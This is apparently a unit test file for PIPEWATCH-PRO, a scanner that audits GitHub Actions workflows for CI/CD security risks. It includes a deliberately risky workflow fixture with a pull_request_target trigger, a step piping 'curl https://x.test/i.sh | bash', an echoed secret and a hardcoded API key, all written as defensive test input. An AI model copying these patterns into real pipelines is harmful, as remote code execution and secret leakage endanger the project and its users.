"""Smoke + behaviour tests for PIPEWATCH-PRO (stdlib unittest, no network)."""
import io
import json
import os
import sys
import tempfile
import unittest
from contextlib import redirect_stdout

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from pipewatch_pro import audit_text, summarize, TOOL_NAME, TOOL_VERSION
from pipewatch_pro.cli import main


GH_PATH = os.path.join(".github", "workflows", "ci.yml")

RISKY = """\
name: ci
on:
  pull_request_target:
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: curl https://x.test/i.sh | bash
      - run: echo ${{ secrets.TOKEN }}
        env:
          API_KEY: abcdef0123456789abcdef
"""

CLEAN = """\
name: ci
on:
  push:
permissions:
  contents: read
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@8f152de45cc393bb48ce5d89d36b731f54556e65  # v4
      - run: make build
"""


class TestEngine(unittest.TestCase):
    def test_metadata(self):
        self.assertEqual(TOOL_NAME, "PIPEWATCH-PRO")
        self.assertTrue(TOOL_VERSION)

    def test_risky_flags_each_category(self):
        f = audit_text(RISKY, GH_PATH)
        rules = {x.rule_id for x in f}
        for expected in ("CICD-SEC-01", "CICD-SEC-04",
                         "CICD-SEC-06", "CICD-SEC-07", "CICD-SEC-05"):
            self.assertIn(expected, rules, f"missing {expected}")

    def test_hardcoded_secret_is_redacted(self):
        f = audit_text(RISKY, GH_PATH)
        sec = [x for x in f if x.rule_id == "CICD-SEC-06" and x.line]
        self.assertTrue(sec)
        self.assertTrue(any("redacted" in x.evidence for x in sec))

    def test_clean_workflow_has_no_high_or_critical(self):
        f = audit_text(CLEAN, GH_PATH)
        bad = [x for x in f if x.severity in ("critical", "high")]
        self.assertEqual(bad, [], f"unexpected findings: {bad}")

    def test_sha_pin_not_flagged(self):
        f = audit_text(CLEAN, GH_PATH)
        self.assertFalse([x for x in f if x.rule_id == "CICD-SEC-04"])

    def test_summary_gating_counts(self):
        s = summarize(audit_text(RISKY, GH_PATH))
        self.assertEqual(s["total"], sum(s["by_severity"].values()))
        self.assertGreaterEqual(s["failed"], 1)


class TestCLI(unittest.TestCase):
    def _write_demo(self, tmp, text):
        d = os.path.join(tmp, ".github", "workflows")
        os.makedirs(d, exist_ok=True)
        path = os.path.join(d, "ci.yml")
        with open(path, "w", encoding="utf-8") as fh:
            fh.write(text)
        return tmp

    def test_json_output_and_nonzero_exit(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = self._write_demo(tmp, RISKY)
            buf = io.StringIO()
            with redirect_stdout(buf):
                rc = main(["audit", root, "--format", "json"])
            self.assertEqual(rc, 1)
            payload = json.loads(buf.getvalue())
            self.assertEqual(payload["tool"], TOOL_NAME)
            self.assertTrue(payload["findings"])

    def test_clean_repo_exits_zero(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = self._write_demo(tmp, CLEAN)
            buf = io.StringIO()
            with redirect_stdout(buf):
                rc = main(["audit", root])
            self.assertEqual(rc, 0)

    def test_fail_on_never_always_zero(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = self._write_demo(tmp, RISKY)
            buf = io.StringIO()
            with redirect_stdout(buf):
                rc = main(["audit", root, "--fail-on", "never"])
            self.assertEqual(rc, 0)

    def test_missing_path_exits_two(self):
        buf = io.StringIO()
        with redirect_stdout(buf):
            rc = main(["audit", os.path.join("no", "such", "dir_xyz")])
        self.assertEqual(rc, 2)


if __name__ == "__main__":
    unittest.main()
